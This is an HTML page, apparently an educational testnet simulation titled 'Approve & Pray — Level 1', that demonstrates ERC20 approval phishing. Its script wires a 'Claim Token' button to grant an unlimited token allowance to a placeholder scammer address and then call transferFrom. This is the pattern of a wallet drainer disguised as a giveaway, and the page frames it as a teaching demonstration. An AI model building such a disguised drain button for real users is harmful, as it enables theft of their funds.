<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Level 1 — ERC20 Approval Trap</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #0d1117;
      color: #f1f1f1;
      margin: 0;
    }
    .top-bar, .warning-bar {
      padding: 1rem;
      text-align: center;
      font-weight: bold;
    }
    .top-bar {
      background: #161b22;
    }
    .warning-bar {
      background: #d32f2f;
      color: #fff;
    }
    .container {
      max-width: 600px;
      margin: auto;
      padding: 2rem;
    }
    .toggle-group {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-bottom: 1rem;
    }
    .button-group {
      display: none;
      flex-direction: column;
      gap: 1rem;
      margin-top: 1rem;
    }
    .button-group.active {
      display: flex;
    }
    button {
      background: #ff9800;
      border: none;
      border-radius: 6px;
      padding: 1rem;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
    }
    .tooltip {
      background: #1e293b;
      margin-top: 2rem;
      padding: 1rem;
      border-left: 4px solid #ff9800;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="top-bar">🎯 Approve & Pray — Level 1</div>
  <div class="warning-bar">⚠️ Simulation Only — Use Sepolia Testnet + Burner Wallet</div>

  <div class="container">
    <div class="toggle-group">
      <button id="mode1Btn">🧪 Drain Simulation</button>
      <button id="mode2Btn">🔬 Step-by-Step</button>
    </div>

    <div id="mode1" class="button-group active">
      <button id="connect1">Connect Wallet</button>
      <button id="claimToken">Claim Token</button>
    </div>

    <div id="mode2" class="button-group">
      <button id="connect2">Connect Wallet</button>
      <button id="approveBtn">Approve Token</button>
      <button id="drainBtn">TransferFrom</button>
      <button id="resetBtn">Reset Allowance</button>
    </div>

    <div id="status" style="margin-top:2rem;font-size:0.95rem;white-space:pre-wrap;"></div>

    <div class="tooltip">
      💡 <strong>What is <code>approve()</code>?</strong><br>
      The <code>approve()</code> function lets another smart contract (like Uniswap or a staking site) spend your tokens.<br>
      Phishing contracts abuse this by getting you to approve **them** instead—and then draining you anytime using <code>transferFrom()</code>.
    </div>
  </div>

  <script>
    const mode1 = document.getElementById("mode1");
    const mode2 = document.getElementById("mode2");
    const status = document.getElementById("status");

    document.getElementById("mode1Btn").onclick = () => {
      mode1.classList.add("active");
      mode2.classList.remove("active");
      status.textContent = "Mode: Drain Simulation";
    };
    document.getElementById("mode2Btn").onclick = () => {
      mode1.classList.remove("active");
      mode2.classList.add("active");
      status.textContent = "Mode: Step-by-Step";
    };

    let provider, signer, user, token, scammer;
    const tokenAddress = "0xYourToken"; // replace
    const scammerAddress = "0xScammer"; // replace
    const tokenABI = [
      "function approve(address,uint256) public returns (bool)",
      "function transferFrom(address,address,uint256) public returns (bool)",
      "function balanceOf(address) public view returns (uint256)"
    ];

    async function connect() {
      if (!window.ethereum) return alert("Please install MetaMask.");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      user = await signer.getAddress();
      token = new ethers.Contract(tokenAddress, tokenABI, signer);
      status.textContent += `\n✅ Connected: ${user}`;
    }

    document.getElementById("connect1").onclick = connect;
    document.getElementById("connect2").onclick = connect;

    document.getElementById("claimToken").onclick = async () => {
      status.textContent = "🚨 Claiming... (approve + transferFrom)";
      const tx1 = await token.approve(scammerAddress, ethers.constants.MaxUint256);
      await tx1.wait();
      const tx2 = await token.transferFrom(user, scammerAddress, ethers.utils.parseEther("100"));
      await tx2.wait();
      status.textContent += `\n💀 Token drained in 1 click!`;
    };

    document.getElementById("approveBtn").onclick = async () => {
      const tx = await token.approve(scammerAddress, ethers.constants.MaxUint256);
      await tx.wait();
      status.textContent += `\n✅ Token approved`;
    };

    document.getElementById("drainBtn").onclick = async () => {
      const tx = await token.transferFrom(user, scammerAddress, ethers.utils.parseEther("100"));
      await tx.wait();
      status.textContent += `\n💀 transferFrom drained tokens`;
    };

    document.getElementById("resetBtn").onclick = async () => {
      const tx = await token.approve(scammerAddress, 0);
      await tx.wait();
      status.textContent += `\n🛡️ Allowance reset to 0`;
    };
  </script>
</body>
</html>
